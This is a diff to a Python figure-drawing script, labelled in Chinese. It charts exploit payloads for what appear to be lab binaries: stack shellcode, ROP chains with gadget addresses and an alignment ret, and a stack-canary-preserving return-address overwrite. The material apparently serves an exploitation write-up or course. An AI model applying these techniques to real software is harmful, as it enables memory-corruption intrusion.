@@ -202,25 +202,26 @@ def fig_payloads():
                    ('"B" x 8', 8, BLUE, BLUE_EDGE),
                    ("0x401a6b", 8, YELLOW, YELLOW_EDGE)],
                   "偏移 0–15：command_buf 的字符串（strcpy 到第 1 个 NUL 为止）；偏移 16–23：saved rbp（伪造）；偏移 24–31：返回地址 → eval 的 mov edi,0x6030d0; call system@plt")
-    payload_strip(c, "payload_dark.py（40 字节，dark-calc → 固定栈 shellcode）", x, 340, w,
-                  [("push4/pop rdi/movabs/jmp（15 B）", 15, GREEN, GREEN_EDGE),
-                   ("NOP x 9", 9, GRAY, GRAY),
-                   ("0x721000800fd0", 8, YELLOW, YELLOW_EDGE),
-                   ("0x4019b9", 8, PURPLE, PURPLE_EDGE)],
-                  "偏移 24：返回地址 → 缓冲区本身（栈页 rwxp）；偏移 32：grade_eval 返回后落到 mov edi,0; call exit@plt，进程 exit(0)")
-    payload_strip(c, "payload_rop.py（56 字节，dark-calc-nx → ROP）", x, 550, w,
+    payload_strip(c, "payload_dark.py（32 字节，dark-calc → 固定栈 shellcode）", x, 340, w,
+                  [("shellcode 21 B（mov eax/push/pop/sub/push/add/jmp）", 21, GREEN, GREEN_EDGE),
+                   ("NOP x 3", 3, GRAY, GRAY),
+                   ("0x721000800fd0", 8, YELLOW, YELLOW_EDGE)],
+                  "偏移 24：返回地址 → 缓冲区本身（栈页 rwxp）；shellcode 先把 exit0 压栈作 grade_eval 的返回地址，再 jmp 进入，进程 exit(0)")
+    payload_strip(c, "payload_rop.py（64 字节，dark-calc-nx → ROP）", x, 550, w,
                   [('"R" x 24', 24, BLUE, BLUE_EDGE),
                    ("0x401a33", 8, YELLOW, YELLOW_EDGE),
                    ("4", 8, GREEN, GREEN_EDGE),
+                   ("0x401a34", 8, GRAY, GRAY),
                    ("0x401978", 8, PURPLE, PURPLE_EDGE),
                    ("0x4018aa", 8, PURPLE, PURPLE_EDGE)],
-                  "pop rdi; ret（csu 尾部 41 5f c3 的第二字节）→ 参数 4 → grade_eval(4) → mov edi,0; call exit@plt（exit(0)）")
+                  "pop rdi; ret（csu 尾部 41 5f c3 的第二字节）→ 参数 4 → 裸 ret（对齐垫片）→ grade_eval(4) → mov edi,0; call exit@plt（exit(0)）")
     payload_strip(c, "payload_canary.py（260 字节，dark-log → 保 canary 改返回地址）", x, 760, w,
                   [('"K" x 8', 8, BLUE, BLUE_EDGE),
                    ("0x4018a3", 8, YELLOW, YELLOW_EDGE),
                    ("4", 8, GREEN, GREEN_EDGE),
+                   ("0x4018a4", 8, GRAY, GRAY),
                    ("0x401677", 8, PURPLE, PURPLE_EDGE),
-                   ('"L" x 224', 224, GRAY, GRAY),
+                   ('"L" x 216', 216, GRAY, GRAY),
                    ("len=0xa0", 4, RED, RED_EDGE)],
                   "偏移 0–127 是 memcpy 的源：伪造 saved rbp + ROP 链；偏移 256–259 把 len 设成 160，使 memcpy 目的 = rbp；canary（偏移 280）未被触碰")
     c.save("fig_payloads.png")
@@ -237,7 +238,7 @@ def fig_darklog():
         ("rbp+0x08  返回地址 → 0x4018a3（pop rdi; ret）", YELLOW, YELLOW_EDGE),
         ("rbp+0x00  saved rbp → \"KKKKKKKK\"", YELLOW, YELLOW_EDGE),
         ("rbp-0x08  stack canary（保持原值，校验通过）", GREEN, GREEN_EDGE),
-        ("rbp-0x18  pad[8]（gets 的 NUL 落在这里）", BLUE, BLUE_EDGE),
+        ("rbp-0x1c  pad[8]（gets 的 NUL 落在这里）", BLUE, BLUE_EDGE),
         ("rbp-0x20  len = 0xa0（由输入偏移 256 控制）", RED, RED_EDGE),
         ("rbp-0xa0  logMsg[128]（memcpy 目的基址）", BLUE, BLUE_EDGE),
         ("rbp-0x120 expression[128]（gets 写入点 / memcpy 源）", GREEN, GREEN_EDGE),
@@ -258,7 +259,7 @@ def fig_darklog():
     c.text(xa, 570, "输入只有 260 字节：gets 的 NUL 落在偏移 260", font=c.f_small)
     c.text(xa, 608, "（pad 区），canary 在偏移 280，没有被覆盖。", font=c.f_small)
     c.text(xa, 660, "返回地址被改成 ROP 链：", font=c.f_small)
-    c.text(xa, 698, "pop rdi; ret → 4 → grade_eval(4)", font=c.f_small)
+    c.text(xa, 698, "pop rdi; ret → 4 → ret（垫片）→ grade_eval(4)", font=c.f_small)
     c.save("fig_darklog.png")
 
 
